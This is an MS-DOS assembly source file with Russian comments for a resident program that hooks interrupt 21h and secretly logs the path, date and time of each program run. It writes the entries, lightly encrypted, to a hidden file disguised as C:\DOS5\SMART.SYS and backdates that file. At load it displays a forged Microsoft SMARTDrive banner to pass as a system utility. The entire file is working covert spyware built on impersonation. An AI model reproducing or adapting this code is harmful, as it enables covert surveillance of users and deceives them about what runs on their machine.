   ; Автор программы - Павел Борзяк, Крымская астрофизическая обсерватория

 	include dos.mac
	data	segment at 0	;Наложение на абсолютный адрес 0
		org	21h*4   ;Вектор прерывания функций ДОС
		DOS_VEC	dd ?
		org	65h*4	;=== МЕНЯТЬ ВЕКТОР 65h ЗДЕСЬ! ===
		CHECK_R dw ?    ;User's vector - Надеюсь, не занят...
	data	ends
	
	code	segment
		assume cs:code,ds:code,es:code
		org	100h	;COM-файл
ENTRY:		jmp	install	;Переход на программу-загрузчик

      OLD_DOS   dd ?	; Адрес прерывания 21h
     MY_PATH	db 80 dup(0) ; Буфер для записи в файл
     MY_PSP	dw ?		; Сегментный адрес моего PSP
    CURR_PSP    dw ?		; Сегментный адрес PSP текущей программы
	HANDL	dw ?		; Хендл файла
	HDUPL	dw ?		; Дубликат Хендла
	LEN	dw ?		; Длина буфера MY_PATH
     COUNT	db ?
	TIM	dw 6080h        ; ФАЛЬШИВАЯ дата создания файла
	DAT	dw 169Ch
	  
BIN_ASC	proc	far	; Процедура преобразования 2-х разрядного десятичного
			; числа в формат ASCII
	assume	cs:code,ds:code,es:nothing
	push	di    
	push	DX
	push 	SI
    	push	AX
	mov	cx,2
f_buff: mov	byte ptr [bx],30h
	inc	bx
	loop	f_buff
	mov	SI,10
	or	AX,AX
	jns	clr_dvd
	neg	AX
clr_dvd: sub	DX,DX
	div	SI
	add	DL,'0'
	dec	bx
	mov	[BX],DL
	inc	CX
	or	AX,AX
	jnz	clr_dvd
	pop	AX
	or	AX,AX
	jns	no_more
	dec	BX
	mov	byte PTR [BX],'-'
	inc	CX
no_more: pop	SI
	pop	DX
	pop	di
        ret
BIN_ASC endp	; В ax помещается число а в bx адрес буфера для ASCII
		; возвращает в cx число преобразованных символов
		


      INTERPT	proc	far	;Перехват прерывания 21h
		assume cs:code,ds:nothing,es:nothing
		cmp	ax,4B00h  ; Проверка на функцию EXEC
		je	MARK_START
		cmp	ah,4Dh  ; Проверка на функцию WAIT
		je	RESET_IT
		cmp	ah,4Ch	; Проверка на функцию EXIT
		je	MARK_END
		jmp OLD_DOS ;Передать прерывание дальше
    MARK_START:	
		inc	COUNT
		jmp	OLD_DOS
    RESET_IT:	
		mov	COUNT,1
		jmp	OLD_DOS
    MARK_END:	
		cmp	COUNT,1
		jna	FQUIT
		jmp	short COME_ON
        FQUIT:	mov	COUNT,0
	        assume ds:nothing,es:nothing
	PQUIT:	jmp OLD_DOS                ; По цепочке дальше в ДОС...:-)
     
  COME_ON:	mov	COUNT,0      ; РАБОТАЕМ!
		push	ax
		push	bx
		push	cx
		push	dx
		push	bp
		push	di
		push	si		
		push	cs
		pop	ds	
	get_psp
		mov	CURR_PSP,bx	; Получаем в bx сегмент текущего PSP
		push	bx
		pop	es	; Загрузить в es
		mov	bp,2Ch	; Смещение в PSP по которому нах. адрес параграфа DOS Env.
		mov	bp,es:[bp]
		lea	bx,es:bp
		push	bx
		pop	es	; Загрузить в es параграф DOS Environment
		mov	bp,0
		mov	di,0
		cld
 		lea	di,es:[bp]
		mov	al,0
		mov	cx,512
AGAIN:	repne	scas	byte ptr [bp] ; Сканируем Environment
		scas	byte ptr [bp]
		jne	AGAIN	; Поиск двух нулевых байтов подряд
		inc	di
		inc	di
		mov	bx,0
  READ_PATH:	mov	al,es:[bp][di] ; Копируем найденную строку в буфер
		mov	MY_PATH[bx],al
		cmp	al,0
		je	PUT_DOWN
		inc	bx
		inc	di
		jmp	READ_PATH
  PUT_DOWN: 	inc	bx		; Строка из DOS Environment скопирована!
		mov	MY_PATH[bx],20h ; Символ пробела в буфер
		inc	bx
		mov	LEN,bx		; Запомнить длину буфера
       get_date				; Получить дату
        	mov	ax,0		; и записать ее в буфер
		mov	al,dl
		lea	bx,MY_PATH[bx]
		call	far ptr BIN_ASC
		mov	di,cx
		mov	byte ptr [bx][di],'-'
		add	bx,cx
		inc	bx
		mov	ax,0
		mov	al,dh
		call	far ptr BIN_ASC
		mov	di,cx
		mov	byte ptr [bx][di],20h
		add	bx,cx
		inc	bx
	get_time			; Получить время
		push	cx		; и записать его в буфер
		mov	ax,0
		mov	al,ch
		call	far ptr	BIN_ASC
		mov	di,cx
		mov	byte ptr [bx][di],':'
		add	bx,cx
		inc	bx
		pop	cx
		mov	ax,0
		mov	al,cl
		call	far ptr	BIN_ASC
		mov	di,cx
		mov	byte ptr [bx][di],0dh	; Записать в буфер CR,LF
		mov	byte ptr [bx+1][di],0ah
		add	LEN,13			; Окончательная длина буфера

                mov	bx,offset MY_PATH       ; Шифрование текста в буфере
                mov     cx,LEN                  ; Символы в буфере ув. на 2
                mov	di,0                    ; и операция xor с числом 48h
		mov	al,48h
ENCRYPT:        mov     ah,byte ptr [bx][di]
		add	ah,2
		xor	ah,al 
		mov	byte ptr [bx][di],ah
                inc	di
                loop    ENCRYPT

  		mov	bx,MY_PSP		; Переключить PSP
		mov	ah,50h
		int	21h
		

	move_ptr HANDL,0,0,2			; Установить указатель файла
		mov	al,MY_PATH[1]
		mov	ah,MY_PATH[2]
		cmp	ax,1674h        ; Проверка на последовательность :\
		jne	MISMATCH
	write_handle HANDL,MY_PATH,LEN	; Записать из буфера в файл
 MISMATCH:	xdup	HANDL			; Создать дубликат хендла
		mov	HDUPL,ax		
        get_set_date_time HDUPL,1,TIM,DAT  ; Установить фальшивую дату для файла
	close_handle HDUPL		; Закрыть дубликат

	 	mov	bx,CURR_PSP	; Переключить PSP обратно
		mov	ah,50h
		int	21h
		pop	si	
		pop	di
		pop	bp
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		jmp	PQUIT           ; All Done!
      INTERPT	endp	


	RESIDENT_PART label byte ;Конец резидентной части
	FNAM	db 'C:\DOS5\SMART.SYS',0  ; === МЕНЯТЬ ПУТЬ ИЛИ ИМЯ ФАЙЛА ЗДЕСЬ! ===
	INFO1: 	db 'Microsoft  SMARTDrive  Disk  Cache  version 6.01',0ah,0dh
                db 'Copyright  1989-1992  Microsoft Corp.',0ah,0dh,'$' 
	install:
		push	cs
		pop	ds
	
		display_s INFO1
		push	cs
		pop	bx
		mov	MY_PSP,bx
    	 

		mov	dx,OFFSET FNAM  ; Создать файл на диске
		   
       		mov	cx,0		; Путь  и имя файла находятся в буфере PSP
		mov	ah,5bh
		int	21h
	  
		jc	OPE_EXIST	; Если файл существует уже то открыть
		mov	HANDL,ax
		jmp	MMM

   OPE_EXIST:  	 mov	dx,OFFSET FNAM	; Открыть файл
		mov	al,2
		mov	ah,3dh
		int	21h
		mov	HANDL,ax
		
    MMM:  	
                mov 	ax,0
		mov	es,ax
		assume 	es:data
		mov	ax,es:CHECK_R
		cmp	ax,0FEDh
                je      IN_MEM      ; Я уже есть в памяти!
                cmp	ax,0
		jne	ERROR_VEC   ; Вектор 65 занят кем-то другим...
		display_char '>'
		cli
		mov	es:CHECK_R,0FEDh          ; Сигнатура нашей программы FED
		mov	ax,word ptr es:DOS_VEC    ; Запомнить вектор прерывания DOS
		sti
		mov	word ptr OLD_DOS,ax
		cli
		mov	ax,word ptr es:DOS_VEC+2
		sti
		mov	word ptr OLD_DOS+2,ax
		cli				; Установить новый вектор
		mov 	word ptr es:DOS_VEC,offset INTERPT    
		mov	word ptr es:DOS_VEC+2,cs
		lea	dx,RESIDENT_PART
		sti
		int 27h			;  TSR
	
  ERROR_VEC:   display_char '!'	 ; Придётся сменить номер вектора 65
  IN_MEM:	end_process 0
		
	code	ends
	end	ENTRY
